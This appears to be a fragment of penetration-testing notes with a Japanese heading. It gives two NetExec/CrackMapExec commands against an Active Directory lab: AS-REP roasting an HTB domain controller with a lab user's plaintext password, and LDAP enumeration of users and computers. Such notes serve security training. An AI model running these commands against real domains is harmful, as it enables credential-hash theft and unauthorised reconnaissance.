```zsh
crackmapexec ldap -dc-ip 10.129.55.181 --kdcHost dc01.inlanefreight.htb -u nicole -p Inlanefreight02! --asreproast asreproast.out
```

# ユーザ/コンピュータ一覧
```zsh
nxc ldap dc.example.local -u 'corp\\user1' -p 'P@ss' --users --computers
```

